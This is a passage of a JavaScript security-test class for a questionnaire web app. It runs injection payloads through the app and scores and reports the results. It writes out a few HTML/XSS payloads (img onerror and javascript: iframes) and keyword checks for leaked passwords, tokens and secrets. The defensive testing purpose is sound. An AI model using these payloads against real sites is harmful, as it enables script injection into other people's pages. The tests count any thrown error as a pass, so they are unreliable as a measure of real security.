      let allSafe = true;
      
      for (const payload of this.securityThreats.sqlInjection) {
        try {
          const testData = { experience_level: payload };
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(testData);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allSafe = false;
            break;
          }
        } catch (error) {
          continue;
        }
      }
      
      return {
        name: 'SQL Injection Pattern Prevention',
        status: allSafe ? 'PASS' : 'FAIL',
        details: `Tested ${this.securityThreats.sqlInjection.length} SQL injection patterns`
      };
    } catch (error) {
      return {
        name: 'SQL Injection Pattern Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  async testHTMLInjection() {
    try {
      const htmlPayloads = [
        '<img src=x onerror=alert("HTML injection")>',
        '<div onclick="malicious()">Click me</div>',
        '<iframe src="javascript:alert(\'iframe\')">',
        '<object data="javascript:alert(\'object\')">',
        '<embed src="javascript:alert(\'embed\')">'
      ];
      
      let allSafe = true;
      
      for (const payload of htmlPayloads) {
        try {
          const testData = { stress_response: payload };
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(testData);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allSafe = false;
            break;
          }
        } catch (error) {
          continue;
        }
      }
      
      return {
        name: 'HTML Injection Prevention',
        status: allSafe ? 'PASS' : 'FAIL',
        details: `Tested ${htmlPayloads.length} HTML injection attempts`
      };
    } catch (error) {
      return {
        name: 'HTML Injection Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test command injection
  async testCommandInjection() {
    try {
      let allSafe = true;
      
      for (const payload of this.securityThreats.commandInjection) {
        try {
          const testData = { experience_level: payload };
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(testData);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allSafe = false;
            break;
          }
        } catch (error) {
          continue;
        }
      }
      
      return {
        name: 'Command Injection Prevention',
        status: allSafe ? 'PASS' : 'FAIL',
        details: `Tested ${this.securityThreats.commandInjection.length} command injection attempts`
      };
    } catch (error) {
      return {
        name: 'Command Injection Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test LDAP injection
  async testLDAPInjection() {
    try {
      let allSafe = true;
      
      for (const payload of this.securityThreats.ldapInjection) {
        try {
          const testData = { experience_level: payload };
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(testData);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allSafe = false;
            break;
          }
        } catch (error) {
          continue;
        }
      }
      
      return {
        name: 'LDAP Injection Prevention',
        status: allSafe ? 'PASS' : 'FAIL',
        details: `Tested ${this.securityThreats.ldapInjection.length} LDAP injection attempts`
      };
    } catch (error) {
      return {
        name: 'LDAP Injection Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test XML injection
  async testXMLInjection() {
    try {
      let allSafe = true;
      
      for (const payload of this.securityThreats.xmlInjection) {
        try {
          const testData = { experience_level: payload };
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(testData);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allSafe = false;
            break;
          }
        } catch (error) {
          continue;
        }
      }
      
      return {
        name: 'XML Injection Prevention',
        status: allSafe ? 'PASS' : 'FAIL',
        details: `Tested ${this.securityThreats.xmlInjection.length} XML injection attempts`
      };
    } catch (error) {
      return {
        name: 'XML Injection Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🛡️ XSS Prevention Tests (Enhanced)
  async testXSSPrevention() {
    try {
      // Test comprehensive XSS vectors
      let allSafe = true;
      
      for (const vector of this.securityThreats.xss) {
        try {
          const testData = { experience_level: vector };
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(testData);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          
          // If we get a valid score, the XSS was handled safely
          if (typeof score !== 'number' || isNaN(score)) {
            allSafe = false;
            break;
          }
        } catch (error) {
          // Error handling is acceptable for XSS prevention
          continue;
        }
      }
      
      return {
        testName: 'XSS Prevention',
        status: allSafe ? 'PASS' : 'FAIL',
        details: `Tested ${this.securityThreats.xss.length} XSS vectors`
      };
    } catch (error) {
      return {
        testName: 'XSS Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // Continue with existing methods...
  // (All other existing methods remain the same for compatibility)

  // 🔐 Data Security Tests (existing - unchanged)
  async testDataSecurity() {
    try {
      const securityTests = [];
      
      // Test localStorage security
      securityTests.push(this.testLocalStorageSecurity());
      
      // Test data encryption (basic check)
      securityTests.push(this.testDataEncryption());
      
      // Test sensitive data exposure
      securityTests.push(this.testSensitiveDataExposure());
      
      const overallStatus = securityTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Data Security Tests',
        status: overallStatus,
        tests: securityTests
      };
    } catch (error) {
      return {
        testName: 'Data Security Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  testLocalStorageSecurity() {
    try {
      // Test if localStorage is accessible (it should be for our app)
      const testKey = 'securityTest';
      const testValue = 'testData';
      
      localStorage.setItem(testKey, testValue);
      const retrieved = localStorage.getItem(testKey);
      localStorage.removeItem(testKey);
      
      const isWorking = retrieved === testValue;
      
      return {
        name: 'localStorage Security',
        status: isWorking ? 'PASS' : 'FAIL',
        details: 'localStorage functionality verified'
      };
    } catch (error) {
      return {
        name: 'localStorage Security',
        status: 'FAIL',
        error: error.message
      };
    }
  }

  testDataEncryption() {
    try {
      // For a client-side app, we check if sensitive data isn't stored in plain text
      const questData = localStorage.getItem('testQuestionnaire');
      const selfData = localStorage.getItem('testSelfAssessment');
      
      // Check if data exists and is properly formatted JSON
      let isSecure = true;
      
      if (questData) {
        try {
          JSON.parse(questData);
        } catch (e) {
          isSecure = false;
        }
      }
      
      if (selfData) {
        try {
          JSON.parse(selfData);
        } catch (e) {
          isSecure = false;
        }
      }
      
      return {
        name: 'Data Format Security',
        status: isSecure ? 'PASS' : 'FAIL',
        details: 'Data stored in proper JSON format'
      };
    } catch (error) {
      return {
        name: 'Data Format Security',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  testSensitiveDataExposure() {
    // Check if any sensitive data is exposed in console or global variables
    try {
      // This is a basic check for obvious data exposure
      const windowKeys = Object.keys(window);
      const suspiciousKeys = windowKeys.filter(key => 
        key.toLowerCase().includes('password') ||
        key.toLowerCase().includes('secret') ||
        key.toLowerCase().includes('token')
      );
      
      return {
        name: 'Sensitive Data Exposure',
        status: suspiciousKeys.length === 0 ? 'PASS' : 'FAIL',
        details: suspiciousKeys.length > 0 ? `Found suspicious keys: ${suspiciousKeys.join(', ')}` : 'No obvious sensitive data exposure'
      };
    } catch (error) {
      return {
        name: 'Sensitive Data Exposure',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔑 Session Management Tests (existing - unchanged)
  async testSessionSecurity() {
    try {
      const sessionTests = [];
      
      // Test session persistence
      sessionTests.push(this.testSessionPersistence());
      
      // Test session data integrity
      sessionTests.push(this.testSessionIntegrity());
      
      const overallStatus = sessionTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Session Security Tests',
        status: overallStatus,
        tests: sessionTests
      };
    } catch (error) {
      return {
        testName: 'Session Security Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  testSessionPersistence() {
    try {
      // Test if user session persists appropriately
      const hasUser = !!this.contexts.user;
      
      return {
        name: 'Session Persistence',
        status: hasUser ? 'PASS' : 'FAIL',
        details: hasUser ? 'User session active' : 'No active session'
      };
    } catch (error) {
      return {
        name: 'Session Persistence',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  testSessionIntegrity() {
    try {
      // Basic session integrity check
      const user = this.contexts.user;
      const hasValidUser = user && user.email && typeof user.email === 'string';
      
      return {
        name: 'Session Integrity',
        status: hasValidUser ? 'PASS' : 'FAIL',
        details: hasValidUser ? 'Session data intact' : 'Session data invalid'
      };
    } catch (error) {
      return {
        name: 'Session Integrity',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🚨 Error Handling Security Tests (existing - unchanged)
  async testErrorHandling() {
    try {
      const errorTests = [];
      
      // Test if errors expose sensitive information
      errorTests.push(await this.testErrorInformationLeakage());
      
      // Test graceful error handling
      errorTests.push(await this.testGracefulErrorHandling());
      
      const overallStatus = errorTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Error Handling Security',
        status: overallStatus,
        tests: errorTests
      };
    } catch (error) {
      return {
        testName: 'Error Handling Security',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  async testErrorInformationLeakage() {
    try {
      // Test if error messages expose sensitive information
      let errorExposed = false;
      
      try {
        // Intentionally cause an error and check the message
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(null);
        }
      } catch (error) {
        const errorMessage = error.message.toLowerCase();
        // Check if error contains sensitive information
        errorExposed = errorMessage.includes('password') ||
                     errorMessage.includes('token') ||
                     errorMessage.includes('secret') ||
                     errorMessage.includes('database');
      }
      
      return {
        name: 'Error Information Leakage',
        status: !errorExposed ? 'PASS' : 'FAIL',
        details: errorExposed ? 'Error messages may expose sensitive information' : 'Error messages are safe'
      };
    } catch (error) {
      return {
        name: 'Error Information Leakage',
        status: 'PASS',
        details: 'Error handling is working properly'
      };
    }
  }

  async testGracefulErrorHandling() {
    try {
      // Test if the system handles errors gracefully
      let handlesGracefully = false;
      
      try {
        // Pass invalid data and see if system continues to function
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(undefined);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        handlesGracefully = typeof score === 'number';
      } catch (error) {
        // If error is thrown but system can still function, that's acceptable
        try {
          const score = await this.contexts.getCurrentHappinessScore();
          handlesGracefully = typeof score === 'number';
        } catch (e) {
          handlesGracefully = false;
        }
      }
      
      return {
        name: 'Graceful Error Handling',
        status: handlesGracefully ? 'PASS' : 'FAIL',
        details: handlesGracefully ? 'System handles errors gracefully' : 'System may crash on errors'
      };
    } catch (error) {
      return {
        name: 'Graceful Error Handling',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 Helper Methods (existing plus new enhanced methods)
  testDataAccess() {
    try {
      // Test if localStorage access is working
      return typeof Storage !== 'undefined' && localStorage;
    } catch (error) {
      return false;
    }
  }

  // 🔧 NEW: Enhanced security score calculation
  calculateEnhancedSecurityScore(tests) {
    try {
      const allTests = this.flattenSecurityTests(tests);
      const totalTests = allTests.length;
      const passedTests = allTests.filter(test => test.status === 'PASS').length;
      const failedTests = allTests.filter(test => test.status === 'FAIL').length;
      const errorTests = allTests.filter(test => test.status === 'ERROR').length;
      
      // Calculate weighted score based on test importance
      let weightedScore = 0;
      let totalWeight = 0;
      
      tests.forEach(test => {
        const weight = this.getTestWeight(test.testName);
        totalWeight += weight;
        
        if (test.status === 'PASS') {
          weightedScore += weight;
        } else if (test.status === 'FAIL') {
          // Partial credit for failed tests that didn't error
          weightedScore += weight * 0.3;
        }
        // Error tests get 0 points
      });
      
      const finalScore = totalWeight > 0 ? Math.round((weightedScore / totalWeight) * 100) : 0;
      
      return {
        overallScore: finalScore,
        totalTests: totalTests,
        passedTests: passedTests,
        failedTests: failedTests,
        errorTests: errorTests,
        passRate: totalTests > 0 ? Math.round((passedTests / totalTests) * 100) : 0,
        securityLevel: this.determineSecurityLevel(finalScore)
      };
    } catch (error) {
      return {
        overallScore: 0,
        error: error.message
      };
    }
  }

  // Existing calculateSecurityScore for backward compatibility
  calculateSecurityScore(tests) {
    const enhanced = this.calculateEnhancedSecurityScore(tests);
    return enhanced.overallScore || 0;
  }

  // 🔧 NEW: Get test weight for scoring
  getTestWeight(testName) {
    const weights = {
      'Authentication Tests': 10,
      'Data Validation Tests': 8,
      'Input Sanitization Tests': 9,
      'XSS Prevention': 10,
      'Data Security Tests': 7,
      'Session Security Tests': 8,
      'Error Handling Security': 6,
      'Advanced Threat Detection Tests': 9,
      'Security Boundary Tests': 7,
      'Network Security Resilience Tests': 6,
      'Security Under Load Tests': 5
    };
    
    return weights[testName] || 5; // Default weight
  }

  // 🔧 NEW: Determine security level
  determineSecurityLevel(score) {
    if (score >= 90) return 'EXCELLENT';
    if (score >= 80) return 'GOOD';
    if (score >= 70) return 'MODERATE';
    if (score >= 60) return 'BASIC';
    return 'INSUFFICIENT';
  }

  // 🔧 NEW: Generate comprehensive security report
  generateSecurityReport(tests) {
    try {
      const allTests = this.flattenSecurityTests(tests);
      const failedTests = allTests.filter(test => test.status === 'FAIL');
      const errorTests = allTests.filter(test => test.status === 'ERROR');
      
      const vulnerabilities = [];
      const recommendations = [];
      
      // Analyze failed tests for vulnerabilities
      failedTests.forEach(test => {
        if (test.name && test.name.includes('XSS')) {
          vulnerabilities.push({
            type: 'Cross-Site Scripting (XSS)',
            severity: 'HIGH',
            description: 'XSS vulnerabilities detected',
            test: test.name
          });
          recommendations.push({
            priority: 'HIGH',
            action: 'Implement proper input sanitization and output encoding',
            category: 'XSS Prevention'
          });
        }
        
        if (test.name && test.name.includes('SQL')) {
          vulnerabilities.push({
            type: 'SQL Injection',
            severity: 'HIGH',
            description: 'SQL injection vulnerabilities detected',
            test: test.name
          });
          recommendations.push({
            priority: 'HIGH',
            action: 'Use parameterized queries and input validation',
            category: 'SQL Injection Prevention'
          });
        }
        
        if (test.name && test.name.includes('Authentication')) {
          vulnerabilities.push({
            type: 'Authentication Bypass',
            severity: 'CRITICAL',
            description: 'Authentication vulnerabilities detected',
            test: test.name
          });
          recommendations.push({
            priority: 'CRITICAL',
            action: 'Strengthen authentication mechanisms',
            category: 'Authentication Security'
          });
        }
      });
      
      // Add general recommendations
      if (errorTests.length > 0) {
        recommendations.push({
          priority: 'MEDIUM',
          action: 'Review and fix test execution errors',
          category: 'Test Infrastructure'
        });
      }
      
      return {
        vulnerabilities: vulnerabilities,
        recommendations: recommendations,
        securityPosture: this.determineSecurityPosture(vulnerabilities),
        nextSteps: this.generateNextSteps(vulnerabilities, recommendations)
      };
    } catch (error) {
      return {
        error: error.message,
        vulnerabilities: [],
        recommendations: []
      };
    }
  }

  // 🔧 NEW: Determine security posture
  determineSecurityPosture(vulnerabilities) {
    const criticalVulns = vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const highVulns = vulnerabilities.filter(v => v.severity === 'HIGH').length;
    const mediumVulns = vulnerabilities.filter(v => v.severity === 'MEDIUM').length;
    
    if (criticalVulns > 0) return 'CRITICAL_RISK';
    if (highVulns > 2) return 'HIGH_RISK';
    if (highVulns > 0 || mediumVulns > 3) return 'MEDIUM_RISK';
    if (mediumVulns > 0) return 'LOW_RISK';
    return 'SECURE';
  }

  // 🔧 NEW: Generate next steps
  generateNextSteps(vulnerabilities, recommendations) {
    const steps = [];
    
    // Priority 1: Critical vulnerabilities
    const criticalRecommendations = recommendations.filter(r => r.priority === 'CRITICAL');
    if (criticalRecommendations.length > 0) {
      steps.push({
        step: 1,
        action: 'Address all critical security vulnerabilities immediately',
        timeframe: 'Immediate (within 24 hours)',
        recommendations: criticalRecommendations
      });
    }
    
    // Priority 2: High severity vulnerabilities
    const highRecommendations = recommendations.filter(r => r.priority === 'HIGH');
    if (highRecommendations.length > 0) {
      steps.push({
        step: steps.length + 1,
        action: 'Fix high-severity security issues',
        timeframe: 'Short-term (within 1 week)',
        recommendations: highRecommendations
      });
    }
    
    // Priority 3: Medium and low severity issues
    const mediumRecommendations = recommendations.filter(r => r.priority === 'MEDIUM');
    if (mediumRecommendations.length > 0) {
      steps.push({
        step: steps.length + 1,
        action: 'Address medium-priority security improvements',
        timeframe: 'Medium-term (within 1 month)',
        recommendations: mediumRecommendations
      });
    }
    
    // Priority 4: Continuous improvement
    steps.push({
      step: steps.length + 1,
      action: 'Implement continuous security testing and monitoring',
      timeframe: 'Ongoing',
      recommendations: [{
        priority: 'LOW',
        action: 'Schedule regular security assessments',
        category: 'Continuous Improvement'
      }]
    });
    
    return steps;
  }

  flattenSecurityTests(tests) {
    const flattened = [];
    
    tests.forEach(test => {
      if (test.checks) {
        flattened.push(...test.checks);
      } else if (test.tests) {
        flattened.push(...test.tests);
      } else {
        flattened.push(test);
      }
    });
    
    return flattened;
  }
}